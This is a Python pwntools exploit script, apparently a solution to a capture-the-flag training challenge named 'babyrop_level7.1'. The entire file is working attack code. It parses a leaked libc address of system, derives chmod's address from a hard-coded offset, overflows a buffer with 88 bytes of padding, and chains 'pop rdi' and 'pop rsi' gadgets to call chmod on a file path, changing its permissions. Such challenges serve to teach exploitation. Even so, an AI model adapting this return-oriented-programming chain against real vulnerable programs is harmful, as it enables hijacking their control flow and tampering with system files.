from pwn import *

p = process("./babyrop_level7.1")

p.recvuntil(b"[LEAK] The address of \"system\" in libc is: ")
leak = p.recvline().split(b'.')[0]
system = int(leak, 16)
chmod_relative_system = 0xac5f0

system_addr = p64(system)
chmod_addr = p64(system + chmod_relative_system)

filename_loc = p64(0x40206d)

payload = b""
payload += b"A" * 80
payload += b"B" * 8
payload += p64(0x401733) # pop rdi ; ret
payload += filename_loc # rdi=filename*
payload += p64(0x401731) # pop rsi ; pop r15 ; ret
payload += p64(0x4) # mode = 0004
payload += b"C" * 8 # junk to put into r15
payload += chmod_addr

p.sendline(payload)

print(p.recvall())

p.close()
